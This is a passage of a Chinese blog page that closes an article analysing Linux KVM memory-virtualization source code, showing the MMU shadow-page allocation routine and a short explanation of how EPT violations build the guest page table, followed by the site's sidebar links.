page加入hash索引，所以前面的for循环中才能知道gfn对应的mmu有没有</span></div><div class="line"><span class="comment">//被分配</span></div><div class="line">	hlist_add_head(&amp;sp-&gt;hash_link,</div><div class="line">		&amp;vcpu-&gt;kvm-&gt;arch.mmu_page_hash[kvm_page_table_hashfn(gfn)]);</div><div class="line">	<span class="keyword">if</span> (!direct) &#123;</div><div class="line">		<span class="keyword">if</span> (rmap_write_protect(vcpu-&gt;kvm, gfn))</div><div class="line">			kvm_flush_remote_tlbs(vcpu-&gt;kvm);</div><div class="line">		<span class="keyword">if</span> (level &gt; PT_PAGE_TABLE_LEVEL &amp;&amp; need_sync)</div><div class="line">			kvm_sync_pages(vcpu, gfn);</div><div class="line"></div><div class="line">		account_shadowed(vcpu-&gt;kvm, gfn);</div><div class="line">	&#125;</div><div class="line">	sp-&gt;mmu_valid_gen = vcpu-&gt;kvm-&gt;arch.mmu_valid_gen;</div><div class="line">	init_shadow_page_table(sp);</div><div class="line">	trace_kvm_mmu_get_page(sp, <span class="literal">true</span>);</div><div class="line">	<span class="keyword">return</span> sp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这样看每次缺页都会分配新的mmu page，虚拟机每次启动是根据guest不停的进行EXIT_REASON_EPT_VIOLATION，整个页表就建立起来了。</p>
<p>—结束—</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-memory/" target="_blank" rel="external">KVM源码分析之内存虚拟化</a>》及原作者信息:<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟化原理/">虚拟化原理</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
  </nav>

</section>
          <aside id="sidebar">
  
    <div class="widget-wrap" style="margin: 20px 0;">
	<div id="search-form-wrap">

    <form class="search-form">
        <label style="width: 75%;">
            <span class="screen-reader-text">Search for:</span>
            <input type="search" class="search-field" style="height: 42px;" placeholder=" 搜索…" value="" name="s" title="Search for:">
        </label>
        <input type="submit" class="search-form-submit" value="搜索">
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(无标题)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
</div>
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">集思广益</h3>
      <p>我们推崇的是黑客与分享精神，如果您觉得本站对您有帮助，不妨自己也参与进来共同建设，期待您能推荐好文章或投稿至本站，
让更多人受益。本站长期招募志愿者与勤工俭学者参与本站的维护和建设，您可通过邮件csyssec@hotmail.com联系我们</p>
       <div class="widget widget_athemes_social_icons">

    	<ul class="clearfix widget-social-icons">   
    	
   			<li><a href="null" title="Words"><i class="fa fa-words" aria-hidden="true"></i></a></li> 

   		
   		</ul>


   		<!--
   		<ul class="clearfix widget-social-icons">   		
   		<li class="widget-si-twitter"><a href="http://twitter.com" title="Twitter"><i class="ico-twitter"></i></a> </li> 
		<li class="widget-si-facebook"><a href="http://facebook.com" title="Facebook"><i class="ico-facebook"></i></a></li>
			<li class="widget-si-gplus"><a href="http://plus.google.com" title="Google+"><i class="ico-gplus"></i></a></li>
			<li class="widget-si-pinterest"><a href="http://pinterest.com" title="Pinterest"><i class="ico-pinterest"></i></a></li>
			<li class="widget-si-flickr"><a href="http://flickr.com" title="Flickr"><i class="ico-flickr"></i></a></li>
			<li class="widget-si-instagram"><a href="http://instagram.com" title="Instagram"><i class="ico-instagram"></i></a></li>


        	</ul> -->

    </div>
  </div>


  
    
  <div class="widget_athemes_tabs">
    <ul id="widget-tab" class="clearfix widget-tab-nav">
      <li class="active"><a>最新推荐</a></li>
    </ul>
    <div class="widget">
      <ul>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170105/mallocsystemcall/">Malloc使用的系统调用</a></h6>
          <!--  <span>一月 5, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/useafterfree/">Use-after-free</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/maleficarum/">Malloc Maleficarum堆溢出</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/heap-offbyone/">堆内off-by-one漏洞利用</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/glibcmalloc/">深入理解glibc malloc</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/heapoverflow-unlink/">Unlink堆溢出</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/pinintro/">二进制代码注入PIN</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-io/">KVM源码分析之IO虚拟化之PIO</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-memory/">KVM源码分析之内存虚拟化</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-cpu/">KVM源码分析之CPU虚拟化</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-create/">KVM源码分析之虚拟机的创建与运行</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170104/kvmsource-intro/">KVM源码分析之基本工作原理</a></h6>
          <!--  <span>一月 4, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-gotgor/">绕过ASLR-第三篇章(GOT覆盖与GOT解引用)</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/bypassaslr-bruteforce/">绕过ASLR-第二篇章(暴力破解)</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
          <li class="clearfix">

            
              <div class="widget-entry-summary" style="margin: 0;">
            

              <h6 style="margin: 0;"><a href="/20170102/rootkittutorial/">Rootkit综合教程</a></h6>
          <!--  <span>一月 2, 2017</span> -->
            </div>

          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类导航</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签导航</h3>
    <div class="widget tagcloud">
      <a href="/tags/ASLR/" style="font-size: 12.5px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10px;">Binary</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 18.75px;">Exploit</a> <a href="/tags/Heap/" style="font-size: 11.25px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 13.75px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.25px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 13.75px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.75px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.75px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11.25px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.75px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.25px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.25px;">Stack</a> <a href="/tags/System/" style="font-size: 18.75px;">System</a> <a href="/tags/Systemcall/" style="font-size: 12.5px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 17.5px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      版权所有&copy; 2017 Index of Computer System and Security 保留所有权利.
      </div>
      <div class="site-credit">
       <!--  自豪地使用 <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a> --> 
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
</script>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/syssec" class="mobile-nav-link">Syssec</a>
  
    <a href="/architecture" class="mobile-nav-link">Architecture</a>
  
    <a href="/virtualization" class="mobile-nav-link">Virtualization</a>
  
    <a href="/malware" class="mobile-nav-link">Malware</a>
  
    <a href="/conferences" class="mobile-nav-link">Conferences</a>
  
    <a href="/academy" class="mobile-nav-link">Academy</a>
  
    <a href="/celebrity" class="mobile-nav-link">Celebrity</a>
  
    <a href="/contribution" class="mobile-nav-link">Contribution</a>
  
    <a href="/donation" class="mobile-nav-link">Donation</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>





  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
  

  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261078922&web_id=1261078922" language="JavaScript"></script>
  </div>


</body>
</html>
